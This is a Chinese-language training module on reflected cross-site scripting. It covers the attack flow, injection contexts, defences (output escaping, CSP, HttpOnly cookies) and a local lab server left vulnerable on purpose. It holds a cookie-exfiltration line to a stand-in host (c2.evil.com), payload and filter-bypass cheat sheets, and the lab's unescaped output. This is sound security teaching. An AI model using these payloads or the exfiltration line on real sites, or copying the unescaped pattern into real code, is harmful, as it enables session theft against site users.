# R14.1 反射型跨站腳本攻擊機制與防禦分析 (Reflected Cross-Site Scripting)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**反射型跨站腳本 (Reflected XSS, RXSS)** 是 Web 最常見的客戶端代碼注入漏洞。其本質為：**「應用程式讀取使用者的 HTTP 請求參數後，未經上下文感知輸出編碼，直接回顯（Reflect）在 HTTP 回應中，誘騙受害者點擊惡意連結以在受害者瀏覽器執行代碼」**。

```
[攻擊者] ── 1. 構造惡意 URL (?q=<script>...) ──► [發布至釣魚郵件 / 論壇]
                                                          │
                                                          ▼ 2. 受害者點擊
[受害者瀏覽器] ── 3. GET /search?q=<script>... ──► [Web 伺服器]
      │                                                │
      │ ◄── 4. 回傳未跳脫 HTML (含惡意腳本) ──────────┘
      │
      ├── 執行惡意 JS，突破同源政策 (SOP) 邊界
      └── 偷渡傳輸：fetch('//c2.evil.com/?c=' + document.cookie)
```

### 核心作戰決策與邊界
- **攻擊特性**：單次即時性（Non-Persistent）、強依賴社交工程（誘使點擊特製 URL）。
- **作戰決策心流**：
  1. **定位上下文 (Context Sink)**：確認輸入落點是 HTML 本體、屬性內部、`<script>` 區塊、抑或 URL 屬性。
  2. **破除閉合 (Breakout)**：使用對應字元（`">`、`'`、`"`、`</script>`）閉合原有結構並帶出執行邏輯。
- **技術邊界**：
  - **與儲存型 (R14.2) 差異**：Payload 不落地，隨請求即時反射。
  - **與 DOM 型 (R14.3) 差異**：Payload 存在於伺服器回傳的原始 HTTP Response Body 中。

## 🔬 第一動：底層機制與瀏覽器詞法解析 (Vulnerability Mechanics & Lexing)

### 瀏覽器五大語法上下文與跳脫規則

| 上下文類型 (Context) | 典型脆弱場景 | 閉合與利用方式 | 正確防禦跳脫標準 |
| :--- | :--- | :--- | :--- |
| **1. HTML 本體** | `<div>結果: {INPUT}</div>` | `<script>alert(1)</script>` | HTML 實體轉義 (`&`, `<`, `>`, `"`, `'`) |
| **2. 標籤屬性內部** | `<input value="{INPUT}">` | `" onfocus="alert(1)" autofocus="` | 屬性引號轉義 (`&quot;`, `&#x27;`) |
| **3. JavaScript 區塊** | `<script>let v = '{INPUT}';</script>` | `';alert(1)//` 或 `</script><svg onload=...>` | Unicode 序列化 (`\u0027`)，嚴禁直接字串拼裝 |
| **4. 資源/超連結 URL** | `<a href="{INPUT}">點擊</a>` | `javascript:alert(1)` | 強制限定 `http://` / `https://` 協定開頭 |
| **5. 樣式區塊 (CSS)** | `<style>body { color: {INPUT}; }</style>` | `red;background:url('javascript:...')` | 嚴格數值/顏色正規驗證 |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心注入向量速查表

| 向量場景 | 典型 Payload | 攻擊特點與規避目標 |
| :--- | :--- | :--- |
| **基礎標籤閉合** | `"><script>alert(document.domain)</script>` | 適用於輸入直接落入 HTML 屬性內部 |
| **免標籤事件觸發** | `"><svg/onload=alert(1)>` | 規避 `<script>` 關鍵字過濾 |
| **圖片錯誤事件** | `"><img src=x onerror=alert(1)>` | 最主流、支援度最高之自動執行載荷 |
| **無點擊焦點搶佔** | `" autofocus onfocus="alert(1)" x="` | 利用屬性注入自動獲取焦點觸發 JS |
| **Script 區塊逃逸** | `</script><img src=x onerror=alert(1)>` | 直接暴力截斷當前 `<script>` 標籤 |

## 🥷 第三動：防禦規避與 WAF 繞過 (Evasion & Filter Bypassing)

- **無空格分隔符**：
  - 利用斜線代替空格：`<svg/onload=alert(1)>`。
- **正則黑名單大小寫混寫**：
  - 繞過弱正則：`<sCrIpt>alert(1)</sCrIpt>`。
- **字元集編碼混淆**：
  - 利用 Base64 解碼執行：`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`。
  - 特殊字元跳脫：利用 `String.fromCharCode(88,83,83)` 規避引號偵測。
- **HTML 實體二階解碼特性**：
  - 當反射點落入 `<a href="...">` 屬性時，瀏覽器會自動對屬性進行 HTML Entity 解碼：  
    `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">` 可繞過粗暴的協定字串過濾。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊手法 (Offense) | 藍隊偵測手段 (Blue Detection) | 安全防禦基線 (Mitigation Baseline) | 繞過與殘餘風險 (Residual Risk) |
| :--- | :--- | :--- | :--- |
| **惡意 URL 釣魚傳播** | WAF 檢測 URL 參數含 `<script>` | 輸出端實施上下文感知 HTML Entity 編碼 | 利用雙重 URL 編碼或混淆事件標籤 |
| **屬性閉合與焦點搶佔** | WAF 攔截 `onfocus`/`autofocus` | 屬性輸出強制加上引號並編碼引號 | 尋找未加引號之邊界屬性直接擴充屬性 |
| **偷渡 Session Cookie** | EDR 偵測非預期外聯連線 | Cookie 全面設定 `HttpOnly` 與 `SameSite` | 無法偷 Cookie；改為直接發起同源 API 操作 |
| **內嵌 Script 變數逃逸** | 靜態代碼審查檢測字串拼接 | 變數輸出一律採用 `json.dumps()` 序列化 | 序列化未處理 `</script>` 標籤字元造成截斷 |

## 🛡️ 第五動：安全架構加固與修復基線 (Hardening & Baseline)

### 1. 輸出端上下文感知轉義 (Python / Web 範例)
```python
import html

# 核心原則：伺服器渲染至 HTML Body 時強制進行實體編碼
def render_reflected_response(user_param: str) -> str:
    return html.escape(user_param, quote=True)
```

### 2. 嚴格 Content-Security-Policy (CSP) 配置基線
```http
# 阻斷內聯腳本執行與非法外聯 C2
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'self';
```

### 3. 認證 Cookie 邊界加固

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心代碼 (`rxss_lab.py`，極簡 20 行)
```python
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlsplit, parse_qs
import html

class RXSSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlsplit(self.path).query)
        kw = query.get("q", [""])[0]
        
        safe = "safe=1" in self.path
        out = html.escape(kw, quote=True) if safe else kw
        
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(f"<h1>搜尋系統</h1><div>結果: {out}</div>".encode())

ThreadingHTTPServer(("127.0.0.1", 8141), RXSSHandler).serve_forever()
```

### 2. 三步驗證流程

1. **CLI 觸發反射型 XSS（確認漏洞）**：
   ```bash
   curl -s "http://127.0.0.1:8141/?q=%3Cscript%3Ealert(document.domain)%3C/script%3E"
   # 回顯未跳脫內容: <div>結果: <script>alert(document.domain)</script></div>
   ```
2. **驗證加固端點（確認防護生效）**：
   ```bash
   curl -s "http://127.0.0.1:8141/?safe=1&q=%3Cscript%3Ealert(document.domain)%3C/script%3E"
   # 回顯已轉義實體: <div>結果: &lt;script&gt;alert(document.domain)&lt;/script&gt;</div>
   ```
3. **瀏覽器實證**：
   - 開啟測試瀏覽器存取上述脆弱 URL，確認彈窗或主控台執行確認。

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼對輸入進行黑名單過濾（如過濾 `<script>`）無法根治反射型 XSS？**  
  *分析思路*：
  - 觸發 JS 方式繁多（`<img>`, `<svg>`, `<details>` 搭配數十種事件處理器）。
  - 黑名單易遭大小寫混寫、無空格符號、偽協定繞過；唯一治本方案為輸出端上下文編碼。

- [ ] **Q2. 反射型 XSS 與 DOM 型 XSS 在封包資料流上的根本區別是什麼？**  
  *分析思路*：
  - 反射型：惡意載荷進入後端伺服器，並包含在伺服器回傳的原始 HTTP 回應內容中。
  - DOM 型：伺服器回傳內容可能完全無害，載荷純粹由前端 JS 從來源（如 `location.hash`）讀取並寫入危險 Sink（如 `innerHTML`）。

- [ ] **Q3. 當反射點位於 `<script> let x = '{INPUT}'; </script>` 內部時，為何 HTML Entity 編碼失效？**  
  *分析思路*：
  - 瀏覽器已經進入 JavaScript 解析器環境，不再進行 HTML 標籤解構。
  - 攻擊者直接使用單引號 `'` 閉合變數並以 `;` 拼接函數即可執行，完全不依賴 `<` 或 `>`。

- [ ] **Q4. 啟用 Content-Security-Policy (CSP) 能否取代程式碼層級的輸出編碼？**  
  *分析思路*：
  - 不能，CSP 是縱深防禦而非根治手段。
  - 未編碼依然可遭 HTML 注入篡改介面或發起釣魚；且過於寬鬆的 CSP 規則極易被繞過。

- [ ] **Q5. 現代前後端架構防範反射型 XSS 的黃金防線為何？**  
  *分析思路*：
  - 前端使用主流框架（React / Vue）預設的文字節點資料綁定機制，杜絕 `innerHTML`。
  - 後端 API 與前端解耦，通訊純走 JSON 傳輸。
  - 全域啟用 `HttpOnly` 憑證隔離與嚴格 CSP Nonce 政策。
